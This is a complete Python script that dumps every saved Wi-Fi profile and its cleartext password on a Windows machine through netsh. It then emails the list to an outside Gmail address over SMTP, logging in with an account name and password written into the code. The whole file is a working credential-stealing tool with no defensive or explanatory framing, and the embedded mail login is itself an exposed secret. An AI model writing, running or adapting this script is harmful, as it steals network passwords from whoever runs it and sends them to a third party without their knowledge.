import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Function to retrieve saved Wi-Fi keys using netsh
def get_wifi_keys():
    wifi_keys = {}
    # Run netsh to get list of profiles
    profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode('utf-8', errors="backslashreplace")
    profiles = [i.split(":")[1][1:-1] for i in profiles.split("\n") if "All User Profile" in i]

    # For each profile, get the Wi-Fi key (if available)
    for profile in profiles:
        try:
            profile_info = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode('utf-8', errors="backslashreplace")
            # Find the key content from the profile info
            key = [i.split(":")[1][1:-1] for i in profile_info.split("\n") if "Key Content" in i]
            if key:
                wifi_keys[profile] = key[0]
            else:
                wifi_keys[profile] = None
        except subprocess.CalledProcessError:
            wifi_keys[profile] = None

    return wifi_keys

# Function to send an email with the Wi-Fi keys
def send_email(subject, body, to_email):
    from_email = "info@infopeklo.cz"  # Your Seznam email address
    password = "Polik789"  # Your Seznam email password

    # Set up the SMTP server
    smtp_server = "smtp.seznam.cz"
    smtp_port = 587

    # Create the email message
    message = MIMEMultipart()
    message["From"] = from_email
    message["To"] = to_email
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))

    try:
        # Connect to SMTP server and send email
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(from_email, password)
        server.sendmail(from_email, to_email, message.as_string())
        server.quit()
        print(f"Email sent to {to_email}")
    except Exception as e:
        print(f"Error sending email: {e}")

# Main function to extract Wi-Fi keys and send them via email
def main():
    wifi_keys = get_wifi_keys()
    if wifi_keys:
        subject = "Saved Wi-Fi Keys"
        body = "Here are the saved Wi-Fi keys:\n\n"
        for profile, key in wifi_keys.items():
            body += f"Network: {profile}\nPassword: {key if key else 'No password found'}\n\n"
        
        # Send the email to your Gmail address
        send_email(subject, body, "alfikeita@gmail.com")
    else:
        print("No Wi-Fi keys found or unable to retrieve.")

if __name__ == "__main__":
    main()
